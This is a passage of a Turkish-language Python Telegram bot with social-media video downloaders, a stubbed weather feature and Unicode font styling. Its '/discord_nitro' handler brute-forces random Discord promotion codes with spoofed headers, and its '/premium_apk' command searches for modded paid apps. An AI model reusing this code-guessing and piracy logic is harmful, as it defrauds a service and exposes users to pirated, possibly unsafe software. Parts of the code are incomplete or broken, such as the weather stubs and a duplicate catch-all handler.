                    gecici_dosya.seek(0)

                    # Geçici dosyayı Telegram'a yükleyin
                    with open(gecici_dosya.name, 'rb') as video:
                        bot.send_video(mesaj.chat.id, video, timeout=1000)
                        # Bekleme mesajını sil
                        bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
        except Exception as hata:
            bot.reply_to(mesaj, f"Video indirilirken bir hata oluştu: {str(hata)}")
            # Hata durumunda bekleme mesajını sil
            bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)

# TikTok video indirici
@bot.message_handler(commands=['tiktok_video_indir'])
@safe_execute
@check_membership
@user_is_logged_in
def tiktok_video_indirici(mesaj: Message):
    argumanlar = mesaj.text.split(maxsplit=1)
    if len(argumanlar) == 1:
        bot.reply_to(mesaj, "Bu Komut İle TikTok'tan Video İndirebilirsin. Örnek Kullanım\n/tiktokvideoindir [TikTok Video Linki]")
        return

    video_linki = argumanlar[1]
    bekleme_mesaji = bot.send_message(mesaj.chat.id, "Video biraz sonra gelir, lütfen video gelene kadar herhangi bir komut girme.")

    indirme_ayarlari = {
        'format': 'best',
        'outtmpl': '/tmp/%(id)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
    }

    with yt_dlp.YoutubeDL(indirme_ayarlari) as ydl:
        try:
            video_bilgileri = ydl.extract_info(video_linki, download=False)
            gercek_video_url = video_bilgileri.get('url', None)
            video_basligi = video_bilgileri.get('title', None)
            
            if gercek_video_url:
                # Videoyu geçici bir dosyaya indir
                with NamedTemporaryFile(suffix='.mp4', delete=False) as gecici_dosya:
                    istek = requests.get(gercek_video_url, stream=True)
                    for parca in istek.iter_content(chunk_size=8192):
                        gecici_dosya.write(parca)

                    gecici_dosya.seek(0)

                    # Geçici dosyayı Telegram'a yükleyin
                    with open(gecici_dosya.name, 'rb') as video:
                        bot.send_video(mesaj.chat.id, video, timeout=1000)
                        # Bekleme mesajını sil
                        bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
        except Exception as hata:
            bot.reply_to(mesaj, f"Video indirilirken bir hata oluştu: {str(hata)}")
            # Hata durumunda bekleme mesajını sil
            bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)

# Threads video indirici
@bot.message_handler(commands=['threads_video_indir'])
@safe_execute
@check_membership
@user_is_logged_in
def threads_video_indirici(mesaj: Message):
    argumanlar = mesaj.text.split(maxsplit=1)
    if len(argumanlar) == 1:
        bot.reply_to(mesaj, "Bu Komut İle Threads'tan Video İndirebilirsin. Örnek Kullanım\n/threadsvideoindir [Threads Video Linki]")
        return

    video_linki = argumanlar[1]
    bekleme_mesaji = bot.send_message(mesaj.chat.id, "Video biraz sonra gelir, lütfen video gelene kadar herhangi bir komut girme.")

    indirme_ayarlari = {
        'format': 'best',
        'outtmpl': '/tmp/%(id)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
    }

    with yt_dlp.YoutubeDL(indirme_ayarlari) as ydl:
        try:
            video_bilgileri = ydl.extract_info(video_linki, download=False)
            gercek_video_url = video_bilgileri.get('url', None)
            video_basligi = video_bilgileri.get('title', None)
            
            if gercek_video_url:
                # Videoyu geçici bir dosyaya indir
                with NamedTemporaryFile(suffix='.mp4', delete=False) as gecici_dosya:
                    istek = requests.get(gercek_video_url, stream=True)
                    for parca in istek.iter_content(chunk_size=8192):
                        gecici_dosya.write(parca)

                    gecici_dosya.seek(0)

                    # Geçici dosyayı Telegram'a yükleyin
                    with open(gecici_dosya.name, 'rb') as video:
                        bot.send_video(mesaj.chat.id, video, timeout=1000)
                        # Bekleme mesajını sil
                        bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
        except Exception as hata:
            bot.reply_to(mesaj, f"Video indirilirken bir hata oluştu: {str(hata)}")
            # Hata durumunda bekleme mesajını sil
            bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)

@bot.message_handler(commands=['insta_video_indir'])
@safe_execute
@check_membership
@user_is_logged_in
def instagram_video_indirici(mesaj: Message):
    argumanlar = mesaj.text.split(maxsplit=1)
    if len(argumanlar) == 1:
        bot.reply_to(mesaj, "Bu komut ile Instagram'dan video indirebilirsin. Örnek Kullanım:\n/instavideoindir [Instagram Video Linki]")
        return

    video_linki = argumanlar[1]
    bekleme_mesaji = bot.send_message(mesaj.chat.id, "Video biraz sonra gelir, lütfen video gelene kadar herhangi bir komut girme.")

    indirme_ayarlari = {
        'format': 'best',
        'outtmpl': '/tmp/%(id)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
    }

    with yt_dlp.YoutubeDL(indirme_ayarlari) as ydl:
        try:
            video_bilgileri = ydl.extract_info(video_linki, download=False)
            gercek_video_url = video_bilgileri.get('url', None)
            video_basligi = video_bilgileri.get('title', None)
            
            if gercek_video_url:
                # Aynı YouTube indirici mantığı ile dosyayı indirip gönder
                with NamedTemporaryFile(suffix='.mp4', delete=False) as gecici_dosya:
                    istek = requests.get(gercek_video_url, stream=True)
                    for parca in istek.iter_content(chunk_size=8192):
                        gecici_dosya.write(parca)

                    gecici_dosya.seek(0)

                    with open(gecici_dosya.name, 'rb') as video:
                        bot.send_video(mesaj.chat.id, video, timeout=1000)
                        bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
        except Exception as hata:
            bot.reply_to(mesaj, f"Video indirilirken bir hata oluştu: {str(hata)}")
            bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
            
# Twitter video indirici
@bot.message_handler(commands=['twitter_video_indir'])
@safe_execute
@check_membership
@user_is_logged_in
def twitter_video_indirici(mesaj: Message):
    argumanlar = mesaj.text.split(maxsplit=1)
    if len(argumanlar) == 1:
        bot.reply_to(mesaj, "Bu Komut İle Twitter'dan Video İndirebilirsin. Örnek Kullanım\n/twittervideoindir [Twitter Video Linki]")
        return

    video_linki = argumanlar[1]
    bekleme_mesaji = bot.send_message(mesaj.chat.id, "Video biraz sonra gelir, lütfen video gelene kadar herhangi bir komut girme.")

    indirme_ayarlari = {
        'format': 'best',
        'outtmpl': '/tmp/%(id)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
    }

    with yt_dlp.YoutubeDL(indirme_ayarlari) as ydl:
        try:
            video_bilgileri = ydl.extract_info(video_linki, download=False)
            gercek_video_url = video_bilgileri.get('url', None)
            video_basligi = video_bilgileri.get('title', None)
            
            if gercek_video_url:
                # Videoyu geçici bir dosyaya indir
                with NamedTemporaryFile(suffix='.mp4', delete=False) as gecici_dosya:
                    istek = requests.get(gercek_video_url, stream=True)
                    for parca in istek.iter_content(chunk_size=8192):
                        gecici_dosya.write(parca)

                    gecici_dosya.seek(0)

                    # Geçici dosyayı Telegram'a yükleyin
                    with open(gecici_dosya.name, 'rb') as video:
                        bot.send_video(mesaj.chat.id, video, timeout=1000)
                        # Bekleme mesajını sil
                        bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
        except Exception as hata:
            bot.reply_to(mesaj, f"Video indirilirken bir hata oluştu: {str(hata)}")
            # Hata durumunda bekleme mesajını sil
            bot.delete_message(chat_id=mesaj.chat.id, message_id=bekleme_mesaji.message_id)
            
            
def generate_user_agent_discord():
    # Basit bir kullanıcı aracısı döndür
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

@bot.message_handler(commands=['discord_nitro'])
@safe_execute
@check_membership
@user_is_logged_in
def send_nitro_links(message):
    try:
        istek_sayisi_customm = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, "Lütfen geçerli bir sayı girin. Örnek kullanım: /discord_nitro 3")
        return

    for _ in range(istek_sayisi_customm):
        karakter_havuzu_customm = 'qwertyuiopQWERTYUIOPasdfghjklASDFGHJKLzxcvbnmZXC.VBN_-M1234567890'
        rastgele_dizgi_customm = ''.join((random.choice(karakter_havuzu_customm) for i in range(16)))
        demo_urll = f'https://discord.com/billing/partner-promotions/1180231712274387115/{rastgele_dizgi_customm}'
        istek_basliklari_custom = {'User-Agent': generate_user_agent_discord()}
        r = requests.post(demo_urll, headers=istek_basliklari_custom)
        if r.status_code == 200:
            hitt_mesaji = f'''
            🛡️ • BY: @TeknoDroidEvreni
            DİSCORD NİTRO : \n\n{demo_urll}'''
            bot.send_message(message.chat.id, hitt_mesaji)
        else:
            bot.send_message(message.chat.id, 'URL GEÇERSİZ')
    bot.send_message(message.chat.id, f"{istek_sayisi_customm} Tane Random Discord Nitrosu.")
@bot.message_handler(commands=["premium_apk"])
@safe_execute
@check_membership
@user_is_logged_in
def apk_ara(message):
    # Kullanıcının girdiği metni al
    kullanici_girdisi = message.text.replace("/premium_apk", "").strip()
    
    # Kullanıcı sorgu metni girmemişse
    if not kullanici_girdisi:
        bot.send_message(message.chat.id, "Bu Komut Sayesinde İstediğin APK'nın Modlu Halini Virüs Olmadan Bulabilirsin.\nÖrnek Kullanım;\n\n/premium_apk Youtube Premium Apk\n\nYukardaki Komut İle Google deki Youtube Premium APK Dosyalarını Sana Atarım.")
        return

    # Google Custom Search API'si ile arama yap
    search_params = {
        "key": API_KEY,
        "cx": SEARCH_ENGINE_ID,
        "q": f"{kullanici_girdisi} apk",
        "num": 5
    }
    response = requests.get(GOOGLE_CUSTOM_SEARCH_URL, params=search_params)
    search_results = response.json().get("items", [])

    # Sonuçları mesaj olarak gönder
    mesaj_gonder = f"{kullanici_girdisi} İçin APK Sonuçları:\n\n"
    if search_results:
        for sonuc in search_results:
            mesaj_gonder += f"{sonuc.get('title')}: {sonuc.get('link')}\n\n"
    else:
        mesaj_gonder += "Sonuç bulunamadı."
    
    bot.send_message(message.chat.id, mesaj_gonder)
    

def translate_weather_description(input_text, target_lang='tr'):
    fetch_response = requests.get(f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={target_lang}&dt=t&ie=UTF-8&oe=UTF-8&q={input_text}")
    if fetch_response.status_code == 200:
        translated_content = fetch_response.json()[0][0][0]
        return translated_content
    else:
        return input_text
      
session_data = {}

def set_user_state(user_id, state):
    """Kullanıcının durumunu ayarla."""
    session_data[user_id] = session_data.get(user_id, {})
    session_data[user_id]['state'] = state

def get_user_state(user_id):
    """Kullanıcının durumunu al."""
    return session_data.get(user_id, {}).get('state', None)

@bot.message_handler(commands=["hava_durumu"])
@safe_execute
@check_membership
@user_is_logged_in
def request_location(msg):
    set_user_state(msg.chat.id, 'awaiting_city')
    bot.send_message(msg.chat.id, "Hangi Şehrin Hava Durumuna Bakmak İstersin.")

def process_city(msg):
    session_data[msg.chat.id]["selected_city"] = msg.text
    set_user_state(msg.chat.id, 'awaiting_neighborhood')
    bot.send_message(msg.chat.id, "Girdiğin Şehirde Hangi Mahalledeki Hava Durumuna Bakmak İstersin.")

def process_neighborhood(msg):
    session_data[msg.chat.id]["selected_neighborhood"] = msg.text
    set_user_state(msg.chat.id, 'awaiting_forecast_span')
    bot.send_message(msg.chat.id, "Kaç Günlük Hava Durumuna Bakmak İstersin.\n1 - Bugün\n5 - 5 Günlük")

def process_forecast_span(msg):
    session_data[msg.chat.id]["forecast_span"] = msg.text
    get_weather_forecast(msg)

def get_weather_forecast(msg):
    city_name = session_data[msg.chat.id]["selected_city"]
    forecast_span = session_data[msg.chat.id]["forecast_span"]
    weather_response = requests.get(f"https://api.openweathermap.org/data/2.5/forecast?q={city_name}&units=metric&appid={WEATHER_API_KEY}")
    
    if weather_response.status_code == 200:
        weather_data = weather_response.json()
        forecast_report = f"{city_name} İçin Güncel Hava Durumu:\n\n"
        if forecast_span == "1":
            # Detayları işle
            pass  # Burada 1 gün için hava durumu detaylarını ekleyin
        elif forecast_span == "5":
            # Detayları işle
            pass  # Burada 5 gün için hava durumu detaylarını ekleyin
        bot.send_message(msg.chat.id, forecast_report)
    else:
        bot.send_message(msg.chat.id, "Hava durumu bilgisi alınamadı.")

@bot.message_handler(func=lambda message: True)
def dispatcher(msg):
    state = get_user_state(msg.chat.id)
    if state == 'awaiting_city':
        process_city(msg)
    elif state == 'awaiting_neighborhood':
        process_neighborhood(msg)
    elif state == 'awaiting_forecast_span':
        process_forecast_span(msg)
        

                                                                     
FONT_STYLES = {
    "kalin": lambda s: f"*{s}*",  # Bold
    "italik": lambda s: f"_{s}_",  # Italic
    "alti_cizili": lambda s: f"__{s}__",  # Underline
    "ustu_cizili": lambda s: f"~{s}~",  # Strikethrough
    "kod": lambda s: f"`{s}`",  # Code
    "oncesiz": lambda s: f"```{s}```",  # Preformatted
    "spoiler": lambda s: f"||{s}||",  # Spoiler
    "daktilo": lambda s: ''.join(chr(0x1D670 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Typewriter
    "taslak": lambda s: ''.join(chr(0x1D608 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Outline
    "italik_serif": lambda s: ''.join(chr(0x1D44E + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Serif Italic
    "kalin_serif": lambda s: ''.join(chr(0x1D400 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Serif Bold
    "kalin_italik_serif": lambda s: ''.join(chr(0x1D468 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Serif Bold Italic
    "kucuk_harfler": lambda s: ''.join(chr(0x1D41A + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Small Caps
    "hafif_el_yazisi": lambda s: ''.join(chr(0x1D4EA + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Script Light
    "kalin_el_yazisi": lambda s: ''.join(chr(0x1D4D4 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Script Bold
    "cizgi_roman": lambda s: ''.join(chr(0x1D4A6 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Comic
    "minik": lambda s: ''.join(chr(0x1D422 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Tiny
    "daireler": lambda s: ''.join(chr(0x24D0 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Circles
    "kalin_sans_serif": lambda s: ''.join(chr(0x1D5D4 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Sans Serif Bold
    "italik_sans_serif": lambda s: ''.join(chr(0x1D608 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Sans Serif Italic
    "kalin_italik_sans_serif": lambda s: ''.join(chr(0x1D63C + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Sans Serif Bold Italic
    "sans_serif": lambda s: ''.join(chr(0x1D5A0 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Sans Serif
    "mutlu": lambda s: ''.join(c + '\u0306' + '\u0308' for c in s),  # Happy
    "bulutlar": lambda s: ''.join(c + '\u035C' + '\u035C' for c in s),  # Clouds
    "gotik": lambda s: ''.join(chr(0x1D56C + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Gothic
    "kalin_gotik": lambda s: ''.join(chr(0x1D504 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Gothic Bold
    "dolu_daireler": lambda s: ''.join(chr(0x1F150 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Circles Filled
    "andalus": lambda s: ''.join(chr(0xABD0 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Andalucia
    "dolu_kareler": lambda s: ''.join(chr(0x1F170 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Squares Filled
    "kareler": lambda s: ''.join(chr(0x1F130 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Squares
    "ozel": lambda s: ''.join(chr(0x1F1E6 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Special
    "uzgun": lambda s: ''.join(c + '\u0311' + '\u0308' for c in s),  # Sad
    "sik": lambda s: ''.join(chr(0xA730 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Fancy
    "alti_cizgili": lambda s: ''.join(c + '\u0332' for c in s),  # Underline Again
    "kabarciklar": lambda s: ''.join(c + '\u20DF' for c in s),  # Bubbles
    "kalp": lambda s: ''.join(c + '\u2764' for c in s),  # Heart
    "yildiz": lambda s: ''.join(c + '\u2736' for c in s),  # Star
    "ay": lambda s: ''.join(c + '\u263D' for c in s),  # Moon
    "gunes": lambda s: ''.join(c + '\u263C' for c in s),  # Sun
    "deniz_dalgalari": lambda s: ''.join(c + '\u0304' + '\u0330' for c in s),  # Ocean Waves
    "ates": lambda s: ''.join(c + '\u035B' for c in s),  # Fire
    "elektrik": lambda s: ''.join(c + '\u0308' for c in s),  # Electricity
    "sihir": lambda s: ''.join(c + '\u0303' for c in s),  # Magic
    "kristal": lambda s: ''.join(c + '\u032B' for c in s),  # Crystal
    "gokkusagi": lambda s: ''.join(c + '\u030A' for c in s),  # Rainbow
    "kar": lambda s: ''.join(c + '\u0307' for c in s),  # Snow
    "yagmur": lambda s: ''.join(c + '\u0301' for c in s),  # Rain
    "duman": lambda s: ''.join(c + '\u0300' for c in s),  # Smoke
    "rakam": lambda s: ''.join(chr(0x1D7D8 + ord(c) - ord('0')) if '0' <= c <= '9' else c for c in s),  # Number
    "yazi_tipi_1": lambda s: ''.join(chr(0x1D5EE + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Font 1
    "yazi_tipi_2": lambda s: ''.join(chr(0x1D622 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Font 2
    "yazi_tipi_3": lambda s: ''.join(chr(0x1D656 + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Font 3
    "yazi_tipi_4": lambda s: ''.join(chr(0x1D68A + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower()),  # Font 4
    "yazi_tipi_5": lambda s: ''.join(chr(0x1D4AE + ord(c) - ord('a')) if 'a' <= c <= 'z' else c for c in s.lower())  # Font 5
}    

@bot.message_handler(commands=['yazitipi'])
@check_membership
@safe_execute
@user_is_logged_in
def yazitipi_start(message):
    args = message.text.split()[1:]  # Komut dışındaki argümanları al
    if not args:
        bot.reply_to(message, "Önce /yazitipi Yaz Ve Yanına Neyin Şeklini Değiştiriceksen Onu Gir\nÖrnek Kullanım;\n/yazitipi TeknoDroid\nBu Komut TeknoDroid Yazısının Şeklini İstediğin Şekilde Değiştirir.")
        return

    text = ' '.join(args)
    user_data[message.chat.id] = text  # Kullanıcının metnini sakla

    style_options = "\n".join([f"{i+1}. {style}" for i, style in enumerate(FONT_STYLES.keys())])
    bot.send_message(message.chat.id, f'Yazı Tipleri:\n{style_options}\n\nBir Sayı Seç Ve Enterle.')

@bot.message_handler(func=lambda message: True)
def yazitipi_choose(message):
    if message.chat.id in user_data:
        try:
            choice_num = int(message.text) - 1
            if choice_num not in range(len(FONT_STYLES)):
                bot.reply_to(message, "Geçersiz numara. Lütfen listeden bir numara seçin.")
                return

            style = list(FONT_STYLES.keys())[choice_num]
            text = user_data.get(message.chat.id, '')
            styled_text = FONT_STYLES[style](text)
            bot.send_message(message.chat.id, styled_text, parse_mode='Markdown')
        except ValueError:
            bot.reply_to(message, "Lütfen geçerli bir sayı girin.")
           
print(*"BOT AKTİF")
if __name__ == '__main__':
    bot.infinity_polling()